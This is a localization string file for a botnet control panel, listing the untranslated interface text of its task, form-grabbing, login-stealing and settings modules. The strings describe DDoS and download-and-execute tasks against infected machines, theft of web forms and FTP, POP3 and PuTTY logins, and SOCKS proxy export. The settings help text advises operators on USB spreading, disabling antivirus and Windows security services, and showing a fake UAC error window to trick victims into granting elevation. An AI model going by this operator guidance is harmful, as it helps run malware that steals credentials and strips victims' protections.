============================================================================================
/index.php
============================================================================================
"Control Panel" => ""
"Logged in as" => ""
"Logged in at:" => ""
"Clients" => ""
"Tasks" => ""
"Statistics" => ""
"Forms" => ""
"Logins" => ""
"Files" => ""
"Services" => ""
"Users" => ""
"User Notices" => ""
"AV Checker" => ""
"Panel Settings" => ""
"Plugins" => ""
"Help" => ""
"Invalid module specified." => ""
"Go back to previous page" => ""

============================================================================================
/login.php
============================================================================================
"myBlog Content Manager" => ""
"Username:" => ""
"Password:" => ""
"Show password" => ""
"Login failed! Please try again." => ""
"Invalid characters specified in input." => ""
"Leave me alone!" => ""
"You did not provide a username and/or password. Please enter valid login information and try again." => ""
"You have entered too many invalid login combinations within a short period of time. Please wait 10-15 minutes and try again." => ""

============================================================================================
/mod_main.php
============================================================================================
"Your panel needs its database structure updated!</strong> &nbsp;<a href=\"update.php\">Click here to update tables" => ""
"Successfully set new sort options" => ""
"Failed to set new sort options because of an SQL error." => ""
"marked as deleted. Will uninstall next time it contacts the server." => ""
"The IP you attempted to search is not valid. Please provide only one (1) valid IPv4 address and try again." => ""
"The GUID you attempted to search is not valid. Please provide only one (1) valid 32-character GUID and try again." => ""
"Invalid countries provided in search terms. Please only use 2-letter TLD's" => ""
"Maximum of 12 countries per search." => ""
"USB Infection" => ""
"Spam / Exploit Pack / Other" => ""
"Online" => ""
"Offline" => ""
"Never" => ""
"Clean" => ""
"Favorite" => ""
"Normal" => ""
"Yes" => ""
"No" => ""
"Laptop" => ""
"Desktop" => ""
"AVs that appear to be disabled:" => ""
"Installed software:" => ""
"Some version of Visual Studio" => ""
"VMPlayer and/or VMWorkstation" => ""
"Extended information for" => ""
"Status:" => ""
"Bot GUID:" => ""
"Source:" => ""
"Install Path:" => ""
"Install Date:" => ""
"Last CheckIn:" => ""
"Bot owned for:" => ""
"Operating System:" => ""
"Local Time:" => ""
"Country:" => ""
"SOCKS4 Port:" => ""
"Bots killed since installed:" => ""
"Host process:" => ""
"Default Browser:" => ""
"Login Username:" => ""
"CPU Info:" => ""
"Video Card Info:" => ""
"Detected AntiVirus:" => ""
"Total times persistence restored bot disk image:" => ""
"Total times bot restarted due to crash:" => ""
"Total serious exceptions:" => ""
"Access Violations:" => ""
"Priv Instruction:" => ""
"Illegal Instruction:" => ""
"Stack Overflow:" => ""
"In Page Error:" => ""
"Running with Administrator privileges:" => ""
"Has .NET Framework installed:" => ""
"Has Java installed:" => ""
"Has ever used Windows RDP:" => ""
"Connected phone devices:" => ""
"Computer Type:" => ""
"Task dirty status:" => ""
"Watch status:" => ""
"Comments:" => ""
"Remove from favorites" => ""
"Add to favorites" => ""
"Save comment" => ""
"Close" => ""
"Remove notice" => ""
"setup.php, setup.sql or update.php still appear to exist in root directory. Please delete these setup files immediately." => ""
"Enabled" => ""
"Disabled" => ""

"General statistics" => ""
"Name" => ""
"Created" => ""
"Version" => ""
"Failed login attempts" => ""
"Active tasks" => ""
"Gate status" => ""
"Connections" => ""
"Total unique groups" => ""
"Total bots" => ""
"Total bots from USB" => ""
"Bots online" => ""
"Bots online (Past 3h)" => ""
"Bots online (Past 24h)" => ""
"Bots online (Past 3 days)" => ""
"Bots online (Past 5 days)" => ""
"Bots online (Past 7 days)" => ""
"New bots (Past 24h)" => ""
"New bots from USB (Past 24h)" => ""
"Bots offline" => ""
"Bots dead" => ""
"Possible duplicate entries" => ""
"Components" => ""
".NET Framework" => ""
"Had phone/tablet connected" => ""
"Has Admin. Rights" => ""
"UAC S.E. Success rate" => ""
"Logs" => ""
"Form captures to date" => ""
"Login captures to date" => ""
"Operating Systems" => ""
"Overview" => ""
"Search" => ""
"Top 5 Countries" => ""
"Number of bots per page:" => ""
"Sort by:" => ""
"Online status" => ""
"Operating System" => ""
"Version" => ""
"Install Date" => ""
"Last CheckIn Date" => ""
"IP Address" => ""
"Group" => ""
"Bots killed" => ""
"Location" => ""
"AntiVirus" => ""
"Version" => ""
"Sort order:" => ""
"Ascending" => ""
"Descending" => ""
"Set sort options" => ""
"Various filters" => ""
"Online" => ""
"Has individual comment" => ""
"Has SOCKS server running" => ""
"Has .NET Framework" => ""
"Has administrative privileges" => ""
"Has used RDP at least once before" => ""
"Operating Systems" => ""
"All Operating Systems" => ""
"IP Search" => ""
"(Only a single IP can be searched at a time)" => ""
"GUID Search" => ""
"(Only a single GUID can be searched at a time)" => ""
"Regional Search" => ""
"(Example: RU, MX, BR, CN, etc...)" => ""
"Date search" => ""
"Installed after (date):" => ""
"Last check in date after (date):" => ""
"Submit" => ""
"Number of bots per page:" => ""
"Sort by:" => ""
"Online status" => ""
"Operating System" => ""
"Version" => ""
"Install Date" => ""
"Last CheckIn Date" => ""
"IP Address" => ""
"Group" => ""
"Bots killed" => ""
"Location" => ""
"AntiVirus" => ""
"Version" => ""
"Sort order:" => ""
"Ascending" => ""
"Descending" => ""
"Set sort options" => ""
"Online" => ""
"Offline" => ""
"Deleted" => ""
"Dead" => ""
"Unknown" => ""
"Local Area Network" => ""
"Unknown" => ""
"You do not have permission to view extended information" => ""
"Display extended information" => ""
"View stored forms for this bot" => ""
"View stored forms for this bot" => ""
"Bot is either already deleted or you do not have permission to uninstall" => ""
"Uninstall bot. This action cannot be reversed!" => ""
"ASN/Provider:" => ""
"IP Information" => ""

"Info" => ""
"Click to toggle quick info" => ""
"Yes" => ""
"No" => ""
"Disabled via settings" => ""
"Computer Name:" => ""
"Video Card:" => ""
"Host Process:" => ""
"Comments:" => ""
"Bot owned for:" => ""
"Has Elevated Privileges:" => ""
"Grabbed Logins:" => ""
"Grabbed Forms:" => ""
"View extended info" => ""
"View captured logins" => ""
"View captured forms" => ""
"Add to favorite bots" => ""
"Remove from favorite bots" => ""

"Favorite bots" => ""
"Machine ID" => ""
"Group" => ""
"IPv4" => ""
"Location" => ""
"Operating System" => ""
"Install date" => ""
"Version" => ""
"AntiVirus" => ""
"Killed" => ""
"Status" => ""
"Options" => ""
"All bots" => ""
"No bots found matching your query" => ""
"No bots found" => ""


============================================================================================
/mod_tasks.php
============================================================================================

"Task was successfully created!" => ""
"Task was successfully edited!" => ""
"Unable to create new task due to unknown SQL error. Please try again." => ""
"A name for this task is required. Please enter a name between 1 and 64 characters and try again." => ""
"The task name you entered was either too long, too short or contained invalid characters. Please enter a alphanumeric name and try again." => ""
"You must enter the number of bots this new task will affect. If you want it to apply to all current bots, please enter 0." => ""
"Invalid bot limit. You must enter a valid numeric value for how many bots this task will apply to." => ""
"You must select a valid expiration date while creating a new task." => ""
"The expiration date you select must not be a date before today." => ""
"You must select at least one selection from the OS menu. Select 'All' if you want this task to affect all operating systems." => ""
"It seems you provided more than 1 country for the task filter but failed to seperate them by a single comma. Please fix that." => ""
"One or more of the hosts you provided seems invalid. Please fix this and try again." => ""
"One or more of the GUIDs you provided seems invalid. Please fix this and try again." => ""
"One or more of the group names you provided seems invalid. Please fix this and try again." => ""
"You must select the initial state of this task (Active or suspended)." => ""
"A command type must be provided." => ""
"Unable to open /exports/ directory to write socks client data. Please make sure this script has write access to the directory first." => ""
"Whoops! It seems there are no SOCKS server entries to export." => ""
"You are not allowed to create these types of task(s)" => ""
"Your account is not allowed to view / create client tasks." => ""
"Expired" => ""
"Completed" => ""
"Suspended" => ""
"Pending completion" => ""
"day(s) until task expires" => ""
"Task expires in less than {RED_COLOR_NUMBER_ONE} day" => ""
"All Regions ..." => ""
"Task #" => ""
"Task name:" => ""
"Task owner (created by):" => ""
"Task type:" => ""
"Task command string:" => ""
"Task executions:" => ""
" => ""
"(Executed)" => ""
"(Maximum)" => ""
"(Failed)" => ""
"Created on:" => ""
"Expires on:" => ""
"Excluded" => ""
"Included" => ""
"Hosts filter {INCLUDE_EXCLUDE}:" => ""
"All hosts" => ""
"GUID(s) filter {INCLUDE_EXCLUDE}:" => ""
"All GUIDs" => ""
"Group(s) filter {INCLUDE_EXCLUDE}:" => ""
"Filter flags:" => ""
"- Only execute on machines that have some version of the .NET framework installed" => ""
"- Only execute on machines that have used remote desktop at some point" => ""
"- Only execute on machines where bot is running with administrative privileges" => ""
"- Only execute on machines that appear to be suitable for bitcoin mining" => ""
"- Only execute on machines that have connected to a Samsung device at some point" => ""
"- Only execute on machines that have connected to a Apple device at some point" => ""
"- Only execute on machines that appear to have no major antivirus installed" => ""
"- Only execute on new machines" => ""
"- Only execute on older machines" => ""
"- Only execute on machines that have had bot on them for at least 6 hours or more" => ""
"- Only execute on bots marked as \"favorite\"" => ""
"- Do not execute on any bots marked as \"favorite\"" => ""
"- Any bot that performs this task gets marked as dirty" => ""
"- Task does not apply to any bots previously marked as dirty from another task" => ""
"- Task only applies to bots currently marked as dirty" => ""
"Filter software installations (Task applies only if each of the following are installed):" => ""
"- Some version of Visual Studio" => ""
"- VMPlayer and/or VMWorkstation" => ""
"Targeted operating systems:" => ""
"- All versions of Windows" => ""
"- Only 32 bit machines" => ""
"- Only 64 bit machines" => ""
"Targeted Regions {INCLUDE_EXCLUDE}:" => ""
"Close" => ""
"Your account is not allowed to edit tasks." => ""
"Your account is not allowed to delete tasks." => ""
"Your account is not allowed to delete tasks." => ""
"Success! Number of bot(s) set to clean:" => ""
"Failed to set dirty bots as clean." => ""
"Your account is not allowed to delete tasks." => ""
"General statistics" => ""
"Botnet" => ""
"Created" => ""
"Version" => ""
"Connections" => ""
"Total bots" => ""
"Bots online" => ""
"Bots offline" => ""
"Dirty bots" => ""
"Non-task features" => ""
"DNS Modification Settings" => ""
"Form Grabber" => ""
"Login Grabber" => ""
"USB Spread Control" => ""
"Select a task" => ""
"DDoS Attack" => ""
"Download / Execute" => ""
"Update bot" => ""
"Visit Link" => ""
"Set Browser Homepage" => ""
"Clear Browser Cookies" => ""
"Plugin Command" => ""
"Run SOCKS server" => ""
"Run Bot Killer" => ""
"System command" => ""
"Terminate until next reboot" => ""
"Uninstall" => ""
"Tasks" => ""
"Add Task" => ""
"Edit Task" => ""
"Total tasks - " => ""
"({NUM_TASKS_COMPLETED}% completed) => ""
"Delete all tasks" => ""
"Delete all completed tasks" => ""
"Suspend all active tasks" => ""
"Set dirty bots to clean" => ""
"Export socks hosts" => ""
"Export socks hosts (With TLD)" => ""
"Download exported socks proxies:" => ""
"Socks" => ""
"entries" => ""
"Invalid task specified." => ""
"Go back to previous page" => ""
"Task options" => ""
"Task name:" => ""
"Maximum bots to execute task:" => ""
"Expiration date for task:" => ""
"Initial task state:" => ""
"Active" => ""
"Suspended" => ""
"Individual targeting:" => ""
"Apply task only to these Bot GUIDs (Example: &lt;GUID_1&gt;, &lt;GUID_2&gt;, ..):" => ""
"Apply to these GUIDs only" => ""
"Exclude these GUIDs" => ""
"Apply task only to bots with these IP(s) (Example: 127.0.0.1, 10.0.0.2, ..):" => ""
"Apply to these IPs only" => ""
"Exclude these IPs" => ""
"Apply task only to bots in these group(s) (Example: group1, somegroup2, ..):" => ""
"Apply to these groups only" => ""
"Exclude these groups" => ""
"The GeoIP database does not appear to be completely loaded. An incomplete or unavailable GeoIP database will not allow the server to determine what country each client is from. You should not use targeted regions until GeoIP data is fully loaded." => ""
"Countries task applies to (Example: RU, KZ, DE ...):" => ""
"Apply to these countries only" => ""
"Exclude these countries" => ""
"Only execute on bots that ..." => ""
"Have .NET Framework" => ""
"Has used Windows Remote Desktop at some point" => ""
"Are running with administrative privileges" => ""
"Has been connected to a Samsung device (phone/tablet) at some point" => ""
"Has been connected to a Apple device (phone/tablet) at some point" => ""
"Have no detectable anti-virus running" => ""
"Is a new bot" => ""
"Is an older bot (First contacted server <strong>more</strong> than 24 hours ago)" => ""
"Is an older bot (First contacted server more than  <strong>6</strong> hours ago)" => ""
"More specific options" => ""
"Only execute this task on <strong>Favorite</strong> bots." => ""
"Do <i>not</i> execute this task on Favorite bots." => ""
"Mark any bot that performs this task as 'Dirty'" => ""
"Do not apply this task to any bots already marked as dirty" => ""
"Only apply this task to any bots <strong>currently marked as dirty</strong>" => ""
"Click here to select filters based on specific installed software" => ""
"Apply task if each of the following are installed ..." => ""
"Has Java" => ""
"Has Skype" => ""
"Has some version of Visual Studio" => ""
"Has VMPlayer or VMWorkstation" => ""
"Has Origin gaming platform" => ""
"Has Steam gaming platform" => ""
"Has Blizzard gaming platform" => ""
"Has League of Legends" => ""
"Has Runescape" => ""
"Has Minecraft" => ""
"Operating Systems this task applies to ..." => ""
"32 bit systems" => ""
"64 bit systems" => ""
"You cannot select both task filters: \'Ignore if bot is dirty\' and \'Apply if bot is dirty\'.\n\nPlease choose one or the other and try again." => ""
"You cannot select both task filters: \'Apply only to favorites\' and \'Do not apply to favorites\'.\n\nPlease choose one or the other and try again." => ""
"You cannot select both task filters: \'Is new bot\' and \'Is an older bot\'.\n\nPlease choose one or the other and try again." => ""
"Add Task" => ""
"Edit Task" => ""
"Unknown" => ""
"Completed" => ""
"Expired" => ""
"Suspended" => ""
"Pending completion" => ""
"Unknown" => ""
"Invalid task" => ""
"Edit" => ""
"Resume" => ""
"Task Name" => ""
"Type" => ""
"Created" => ""
"Executed / Max / Failed" => ""
"Status" => ""
"Options" => ""
"Success" => ""
"Success / Warning" => ""
"Error" => ""
"Unknown" => ""
"Bots who have completed task #" => ""
"Name:" => ""
"Executed:" => ""
"Failed:" => ""
"View All" => ""
"View failed executions only" => ""
"Bot IP" => ""
"Country" => ""
"Date completed" => ""
"Status" => ""
"Additional Information" => ""
"* If <strong>N/A</strong> is specified in the IP field, then the bot entry for this task was not found in the database. It may have been cleared" => ""
"Invalid task id" => ""


============================================================================================
/mod_forms.php
============================================================================================
"Filter successfully added to list." => ""
"An SQL error occured and the filter could not be added." => ""
"You must provide valid filter(s) to add." => ""
"The filter you provided is too long and/or invalid." => ""
"The filter you provided is too generic. Please only use filters pertaining to specific websites and not global form captures." => ""
"No filters were deleted. List was either empty or there was an error deleting filters." => ""
"Filters successfully deleted." => ""
"All filters were deleted" => ""
"No filters were suspended. List was either empty, there was an error suspending filters, or no filters were in an active state" => ""
"All filters successfully suspended." => ""
"All filters were suspended" => ""
"No filters were resumed. List was either empty, there was an error suspending filters, or no filters were in a suspended state." => ""
"All filters successfully resumed." => ""
"All filters were resumed" => ""
"potentially useless form captures deleted from database" => ""
"No potentially useless form captures found" => ""
"Deleted form capture #{FORM_ID} from database" => ""
"Failed to delete form capture #{FORM_ID} from database" => ""
"NULL or invalid form filter id provided." => ""
"Invalid filter state modifier provided." => ""
"Successfully changed filter state." => ""
"Failed to change filter state due to an SQL error." => ""
"The maximum number of filters possible has been reached. The filter: <strong>{FILTER_TEXT}</strong>, and any after it were not added!" => ""
"Too many filters were provided. There is a maximum of 1024 filters allowed. Please shorten your list and try again." => ""

"Some issues were encountered adding one or more URL/content capture masks. Please evaluate the URL/content masks provided and make sure they meet the following conditions:<br />1. At least 4 characters in length, excluding any wildcards (*).<br />2. Are no longer than 242 characters.<br />3. Do not contain multiple side-by-side wildcards (**)<br />4. Does not already exist on filter list.<br />------<br />Number of improperly formatted filters: {NUMBER_OF_BAD_FILTERS}<br />Number of filters in list that already existed: {NUMBER_OF_PREEXISTING_FILTERS}<br />Number of failed SQL attempts: {NUMBER_OF_FILTERS_FAILED_BY_SQL_ERROR}" => ""

"{NUMBER_OF_NEW_FILTERS} new formgrab filters added" => ""
"Successfully added {NUMBER_OF_NEW_FILTERS} new filter(s)" => ""
"Bots are running in reduced functionality mode. This feature is not currently operational in this mode." => ""

"Formgrab filter example:\n\n*somesite.com/login.php*\n\nAlways surround your filter with \'*\', as this is a wildcard, and comparisons are done by URL and not domain name.\nYou can also use wildcards in the middle of a url:\n\n*somesite.com/*/login.php*\n\nWhere /*/ represents any directory. Multiple filters are accepted in above field, 1 per line.\n\nTo add a filter based on the content of a POST request, and not by the URL, you can add such things as *&param=*, and click the button \'Add as content filter\'\n\n" => ""

"Add your content-based filters the same as you would in the text field (eg: *&user=*), then click the "Add as content filter" button" => ""

"General statistics" => ""
"Botnet" => ""
"Created" => ""
"Version" => ""
"Grab statistics" => ""
"Total forms captured" => ""
"Total special forms captured" => ""
"Total URL filters" => ""
"Forms captured (past 24 hours)" => ""
"Forms captured (past 3 days)" => ""
"Forms captured (past 7 days)" => ""
"Configure" => ""
"View captured forms" => ""
"Manage website grab filters" => ""
"Clear all captured forms" => ""
"Clear all captured forms older than a week" => ""
"Export captured forms" => ""
"Clear existing export logs" => ""
"View details" => ""
"Delete" => ""
"Export" => ""
"Remove grab filter from list and stop all captures associated with filter" => ""
"Delete filter" => ""
"Enabled" => ""
"Disable this filter and do not grab any forms associated with the mask" => ""
"Suspend" => ""
"Disabled" => ""
"Enable this filter and start grabbing forms from URLs that match the mask" => ""
"Resume" => ""
"Export all form captures from this filter mask" => ""
"Content" => ""
"Form grabber status:" => ""
"Enable" => ""
"Disable" => ""
"(Inactive: No website filters exist. Formgrabber requires you to specify website filters to grab forms from.)" => ""
"Download exported forms:" => ""
"Grabbed forms" => ""
"entries" => ""
"Invalid form entry" => ""
"Unknown (Probably POST)" => ""
"Bot GUID:" => ""
"Bot OS:" => ""
"Bot local time:" => ""
"Capture time:" => ""
"Last IP:" => ""
"Country:" => ""
"Request type:" => ""
"Host process:" => ""
"Capture URL:" => ""
"Click here to view select POST headers from form capture" => ""
"Start search from (date)" => ""
"Search for specific website" => ""
"(Partial text but no wildcards supported)" => ""
"Search by bot GUIDs" => ""
"Search in form capture content" => ""
"View All" => ""
"View POST captures only" => ""
"View GET captures only" => ""
"Found {NUMBER_OF_FORMS_FOUND} result(s)" => ""
"Delete ad-related/safe browsing-related captures" => ""
"Host" => ""
"Form" => ""
"Browser" => ""
"Capture date" => ""
"Options" => ""
"No forms captured ..." => ""
"No results ..." => ""
"Enter website URL / content filter(s)" => ""
"(Wildcards (*) supported, but not REGEX)" => ""
"Add as URL filter(s)" => ""
"Add as content filter(s)" => ""
"Show example filter" => ""
"How to add filters based on form content" => ""
"Delete all filters" => ""
"Suspend all filters" => ""
"Resume all filters" => ""
"Form count by filter currently disabled via panel settings" => ""
"Filter" => ""
"Filter Type" => ""
"Captures" => ""
"State" => ""
"Options" => ""
"No filters have been created ..." => ""

============================================================================================
/mod_logins.php
============================================================================================
"Login Capture #{LOGIN_ID}" => ""
"Login Source:" => ""
"Source bot record id:" => ""
"Source bot GUID:" => ""
"Host / IP:" => ""
"Port:" => ""
"Username:" => ""
"Password:" => ""
"Added to database on:" => ""
"Close" => ""
"Deleted login capture #{LOGIN_ID} from database" => ""
"Failed to delete login capture #{LOGIN_ID} from database" => ""
"Login grabber status set to ON" => ""
"Login grabber status set to OFF" => ""
"Successfully cleared all stored logins" => ""
"Successfully cleared all stored POP3 logins ({$NUMBER_OF_LOGINS_DELETED} grabbed logins deleted)" => ""
"Unable to delete stored POP3 logins due to an SQL error" => ""
"General statistics" => ""
"Botnet" => ""
"Created" => ""
"Version" => ""
"Grab statistics" => ""
"Total logins captured" => ""
"FTP Client passwords" => ""
"FTP passwords from network sniffing" => ""
"PuTTY Login captures" => ""
"POP3 passwords" => ""
"Export" => ""
"Export raw logins data" => ""
"Clear existing export logs" => ""
"Clear all stored logins" => ""
"Clear all stored POP3 logins" => ""
"View Details" => ""
"Delete" => ""
"Download exported logins:" => ""
"Grabbed logins" => ""
"entries" => ""
"Login grabber status:" => ""
"Disabled" => ""
"Enabled" => ""
"Disable" => ""
"Enable" => ""
"Search for specific host / IP / Client:" => ""
"(Partial text but no wildcards supported)" => ""
"Found {NUMBER_OF_FOUND_LOGINS} result(s) similar to '{LOGIN_SEARCH_TERM}'"  => ""
"Login Source" => ""
"Host" => ""
"Username" => ""
"Password" => ""
"Date Captured" => ""
"Options" => ""
"No logins captured ..." => ""
"No results ..." => ""


============================================================================================
/mod_spanel.php
============================================================================================

"Settings were successfully updated!" => ""
"A name for this botnet is required. Please enter a name between 1 and 32 characters and try again." => ""
"The name you entered was either too long, too short or contained invalid characters. Please enter a alphanumeric name and try again." => ""
"You must enter the number of days you want before <i>inactive</i> bots are marked as 'dead'" => ""
"Invalid inactive bot value. Must be a numeric value from 2 - 90. (Measured in days)" => ""
"You must enter the number of minutes between each bot knock (update request)." => ""
"Invalid bot knock interval. Must be a numeric value from 20 - 9999. (Measured in minutes)" => ""
"You must enter a encryption key to use for client/server communications." => ""
"Invalid encryption key specified. Must be between 6 - 32 characters long and not contain the backslash character" => ""
"Your login page Secure Code must be between 2 - 16 characters and only consist of alphanumeric characters." => ""
"The ISO-2 country codes you provided were in the incorrect format. Please provide exactly like this:" => ""
"Your account is not allowed to change panel settings." => ""
"Successfully cleared event logs." => ""
"Successfully cleared failed logins count." => ""
"Failed to clear due to an unknown SQL error." => ""
"Successfully optimized clients table." => ""
"Failed to optimize table due to an unknown SQL error." => ""
"All dead bot client records wiped from database" => ""
"Successfully cleared {NUMBER_OF_BOTS_DELETED} bots marked as 'dead'" => ""
"Failed to clear dead bots due to an unknown SQL error." => ""
"All grabbed form/login records wiped from database" => ""
"Successfully cleared client logs." => ""
"Failed to clear client logs due to an unknown SQL error." => ""
"Successfully deleted: {LOG_FILE_NAME}" => ""
"Failed to delete: {LOG_FILE_NAME}" => ""
"{LOG_FILE_NAME} was not deleted because it does not exist." => ""
"All client records wiped from database" => ""
"Successfully cleared all client records from the database." => ""
"Failed to clear client records due to an unknown SQL error." => ""
"DNS list update failed. The provided list is too short." => ""
"DNS list update failed. DNS modification entry #{DNS_LIST_INDEX} is invalid: <i>{SPLIT_ENTRY_INDEX}</i>" => ""
"Unable to create/update DNS modification list. You have too many records. Please only provide less than 1024 records." => ""
"DNS modification list update was successful." => ""
"Unable to write new DNS list to data file. Please check file/folder permissions and try again." => ""
"IP blacklist cleared." => ""
"IP blacklist update failed. The provided list is too short." => ""
"IP Blacklist update failed. Entry #{BLACKLIST_INDEX} contains an invalid reason-code. All codes must be numeric and no longer than 3 digits: <i>{SPLIT_ENTRY_INDEX}</i>" => ""
"IP Blacklist update failed. IP entry #{BLACKLIST_INDEX} is invalid: <i>{SPLIT_ENTRY_INDEX}</i> LEN({SPLIT_ENTRY_LENGTH})" => ""
"IP blacklist was successfully updated!" => ""
"Updated failed. An unknown SQL error occured." => ""
"Invalid character detected:" => ""
"Please only use alphanumeric characters and/or the following: . and - (period, dash and space)" => ""
"Database Management" => ""
"Clear dead bots from the database. When bots are marked dead, they are still kept in the database for a period of at least 20 days. Click the button below to clear all bots marked as 'dead' (regardless of how long they have been in that state) from the database. <i>You cannot undo this operation. All changes are permanent!</i>" => ""
"Clear dead bots" => ""
"Clear all logs. This will clear all logs that bots have uploaded. This includes <strong>form data</strong>, <strong>stored login information</strong> and any other data captured from a client's computer. Once this is erased, <i>it is unrecoverable. All changes are permanent!</i>" => ""
"Clear stored logs" => ""
"Clear all client records. This will reset the clients table and all records of identified bots will be erased. Logs will remain but only be identifiable with limited information. Once this is erased, <i>it is unrecoverable. All changes are permanent!</i>" => ""
"Clear all client records" => ""
"List of DNS records to modify" => ""
"Enter domain entries in this format:" => ""
"And so on. Wildcards are accepted. Failure to abide precisely by this format could result in unknown errors. Maximum of <strong>1024</strong> entries are allowed." => ""
"Close" => ""
"IP Blacklist" => ""
"Enter blacklisted IPs in the following format:" => ""
"General" => ""
"Bot" => ""
"Advanced" => ""
"Security" => ""
"DNS Modification" => ""
"Logs" => ""
"General settings" => ""
"Language:" => ""
"English" => ""
"Russian" => "русский"
"Operation name:" => ""
"Optimization options" => ""
"Disable individual form/login grab counts for individual bot entries on main page to speed up page loading" => ""
"This toggles whether or not the login grab count and the form grab count for each individual bot entry (under each entry's collapsible quick info field) on the main page will be shown. By disabling the retrieval of this information, 2 database queries per bot are avoided and depending on the server specifications and total size of the net, can speed up the main page rendering time somewhat." => ""
"View only minimum statistics on main page" => ""
"Displays only very minimal statistics on the left hand side of the main page. By doing this, less database queries are issued on each page load and thus improves rendering time." => ""
"View only minimum info on 'Manage website grab filters' page" => ""
"Omits the number of forms captured for each filter listing. For users with hundreds of filters and many thousands of actual form grabs, this will result in a considerable drop in page load time for the form filters page." => ""
"Do not display charts / graphs on main page" => ""
"Hides the country graphs / charts on the main page." => ""
"Database Records Maintenance" => ""
"Optimize database" => ""
"Delete gate log file" => ""
"(File does not currently exist)" => ""
"(currently {SIZE_OF_FILE_IN_BYTES}) => ""
"Debug options" => ""
"Enable panel gate debug output" => ""
"Toggles whether or not to enable output to gate error file (gate_err.txt in main directory). Used for debugging purposes if issues occur during gate processing" => ""
"Memory caching is enabled." => ""
"Memory caching is disabled! Panel optimizations cannot be made without APC extension." => ""
"Bot settings" => ""
"Number of days before bot is marked dead:" => ""
"The number of days a bot can go without checking in (booting up their computer) before they are marked as 'dead', or in other words, the bot may have been removed after <i>x</i> number of days." => ""
"Bot knock interval (in minutes):" => ""
"The number of minutes to elapse between check-ins. Every <i>x</i> number of minutes, the bot will contact this control server and request any new tasks/information/configuration updates." => ""

"ON" => ""
"OFF" => ""
"Proactive defense modes:" => ""
"General proactive defense" => ""
"The bot's proactive defense system includes several systems that work together to prevent not only the removal of this bot but also the installation/proper functioning of other, unrelated malware that may exist on the system." => ""
"If you plan on downloading other bots / tools to this system, you should turn this OFF and keep it off." => ""

"Miner proactive defense" => ""
"When this feature is turned ON, it will attempt to automatically disable any miner detected on the system." => ""
"If you plan on downloading other cryptocurrency miners to this system, you should turn this OFF and keep it off." => ""
"Aggressive antivirus disabler" => ""
"This is a separate, more aggressive system of the BDS (Bot Defense System). This will attempt to disable any antivirus solutions it detects running. In order to do this, it requires administrative privileges on Vista/7/8, and will attempt to socially-engineer the user into allowing bot to run with elevated rights. On new bots, this will not take place for at least 5 minutes after bot installation in order to not arouse suspicion." => ""

"USB Drive spreading" => ""
"This controls whether USB drive infection is enabled or not. By default, it is enabled. This feature works not by any autorun.inf or exploitable .LNK files, but rather by replacing the root folder objects with redirections to your bot. It is recommended you keep this on if you wish to spread your bot more easily." => ""

"Block installation of common bootkits" => ""
"This defends against common bootkit installation techniques in user mode. While the code is hard to touch in kernel mode, this will attempt to block installation by protecting sensitive areas of the hard disk and blocking known process elevation techniques on Vista+" => ""
"Force IE as default browser" => ""
"This forces the default browser to Internet Explorer and closes all other browsers periodically. This is to preserve the functionality of older 3rd party tools that no longer work with newer versions of other browsers besides IE." => ""

"Reduced functionality mode:" => ""

"
Enabling reduced functionality mode can improve bot reliability but also disables certain functionality, as well all system wide injection. Features disabled are:<br />

1. Userkit<br />

2. Formgrabber (Only if first 'reduced functionality' option is checked)<br />
3. Live FTP/POP3 login stealer (Client info stealer remains enabled)<br />

4. Process persistence<br />

5. Proactive defense mode(s)<br /><br />

If you are running a private network, the userkit/proactive defense mode and process persistence are largely not needed. Changes take effect on reboot.
"Enable reduced functionality mode <i>(No injections)</i>" => ""

"Enables or disables system-wide components. These include the bot process persistence, formgrabber, live ftp login stealer and userkit." => ""
"Additional bot Settings" => ""
"Important note regarding these settings" => ""
"It is recommended you only toggle the following settings if you know what you are doing and what each individual option below does. Typically it is not necessary to configure any of these options except for skilled users running more complicated operations to which require a finer degree of control over specific functionality. Click the question mark (?) after each option to view more detailed information on it." => ""
"AV Killer" => ""

"Disable Image Execution Options functionality" => ""
"This part of the AV/Bot killer functionality plays a minor role in its effectiveness and as time goes on has been becoming more and more detected by behavioral monitoring systems of various security products. If you notice detections for this functionality start to occur and are not addressed in a timely fashion, you can ENABLE this setting to mitigate losses until the issue is fixed." => ""

"Disable UAC fake error window" => ""
"This option toggles whether or not the fake UAC error window is shown. The fake error window is not the UAC prompt itself, but rather the 'official looking' multi-lingual window preceding it that attempts to explain why they need to accept the UAC prompt that follows. For some users who prefer 'quieter' bot operation, this may be preferable." => ""

"Do not disable Windows Update / Firewall / other security services and settings" => ""
"This option toggles whether or not important services such as Windows Update, Windows Firewall, Windows Defender and so on will be turned off when the AV killer is run." => ""

"Disable Limited User Accounts (LUA)" => ""
"Disables LUA/UAC when elevated to kill AV(s). This will allow all programs to run with elevated privileges on reboot." => ""

"Disable Automatic Updates for popular browser addons" => ""
"Disables automatic updates for Adobe Flash, Reader and Java. Additionally, Java Security settings are lowered. IE Blocked Addons functionality is also disabled" => ""

"Security related" => ""
"Disable system-wide userkit (x86 and x64)" => ""
"Disables the system-wide userkit for all processes. By choosing this option, the login grabber (for FTP/POP3 logins) will also be disabled as it relies on the x86 userkit to function." => ""

"Disable system-wide x64 process userkit" => ""
"Disables the userkit for 64-bit process(es) only." => ""

"Installation options" => ""
"Set HKLM RunOnce instead of Task Scheduler for elevated reboot persistence when possible" => ""

"This will attempt to set the HKEY_LOCAL_MACHINE\...\RunOnce startup key instead of using Task Scheduler to come back on reboot with elevated privileges. Not all circumstances will allow the bot to set this key, so when it is unable, it will use Task Scheduler instead.<br /><br />If you are using a crypter that has a long delay on launch (anti-emul / etc), then you may not want to use this option as it will make explorer hang on reboots until the crypter finishes its delay" => ""

"Formgrab options" => ""
"Try to filter out useless formgrabs" => ""
"Ignores grabbed POST data from advertisement / safe-search websites" => ""

"Additional panel Settings" => ""
"Debug related" => ""

"Task related" => ""

"Only send update tasks on check-in requests" => ""
"The first request a bot sends on each reboot of main bot instance is a panel registration request, which contains more information than a regular check in. This request is only performed once, and each subsequent request is a check in or relevant grab request. This option causes the panel to only send update tasks if the bot request is a regular check-in and not a grab/registration request." => ""

"Security settings" => ""
"Login page security code:" => ""

"Special login page security code <i>(Optional)</i>:" => ""
"This is a special code that, if set, will be required in the login page link. If you find someone is attempting to brute force an account or otherwise attack your panel, you can add this security code for extra measure. This will only display/accept login attempts if the link contains the security code you enter here, in the following format:<br /><br />login.php?sc=<i>special security code here</i><br /><br />A string no longer than 16 alphanumeric characters is accepted. Leave this area empty if you do <strong>not</strong> want to use a special security code." => ""

"Enable IP Blacklist" => ""
"Blacklist hosts executing suspicious queries" => ""
"Blacklist TOR IPs" => ""
"Gate filters:" => ""
